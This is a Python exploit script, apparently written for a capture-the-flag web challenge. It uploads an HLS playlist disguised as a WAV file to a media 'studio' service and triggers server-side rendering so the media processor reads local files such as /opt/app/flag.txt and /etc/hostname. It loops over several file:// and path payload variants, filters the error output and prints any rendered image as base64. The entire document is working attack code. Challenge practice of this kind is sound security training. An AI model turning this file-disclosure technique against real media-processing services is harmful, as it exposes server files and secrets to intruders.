#!/usr/bin/env python3
import io,json,base64,urllib.request,urllib.error,http.cookiejar
BASE='https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com'
def op():
 c=http.cookiejar.CookieJar(); o=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(c));o.addheaders=[('User-Agent','x')];return o
def req(o,p,d=None,h={},m=None):
 r=urllib.request.Request(BASE+p,data=d,headers=h,method=m)
 try:
  x=o.open(r,timeout=90);return x.status,x.read()
 except urllib.error.HTTPError as e:return e.code,e.read()
def up(o,s):
 b='----x'; x=(f'--{b}\r\nContent-Disposition: form-data; name="clip"; filename="x.wav"\r\nContent-Type: audio/wav\r\n\r\n'+s+f'\r\n--{b}--\r\n').encode();return req(o,'/studio/upload',x,{'Content-Type':f'multipart/form-data; boundary={b}'},'POST')
def ren(o):
 st,b=req(o,'/api/render',json.dumps({'slug':'p','theme':'midnight'}).encode(),{'Content-Type':'application/json'},'POST');return json.loads(b)
def pl(seg):return f'#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:2\n#EXTINF:2,\n{seg}\n#EXT-X-ENDLIST\n'
for seg in ['file:///opt/app/flag.txt#x.wav','file:///opt/app/flag.txt?x.wav','file:/opt/app/flag.txt#x.wav','file:/opt/app/flag.txt?x.wav','/opt/app/flag.txt?x.wav','/opt/app/flag.txt#x.wav','http://127.0.0.1/opt/app/flag.txt#x.wav','file:///etc/hostname#x.wav']:
 o=op();req(o,'/studio');up(o,pl(seg));j=ren(o); print('\n',seg,'OK',j.get('ok')); e=j.get('errors','');print('\n'.join(x for x in e.splitlines() if any(k in x for k in ['allowed','Failed','Error when','Input #0','Duration','Stream #0:0','No such','Protocol'])))
 if j.get('ok'):
  st,p=req(o,j['outputs'][0]['url']);print('PNG',len(p));print('B64_START');print(base64.b64encode(p).decode());print('B64_END')
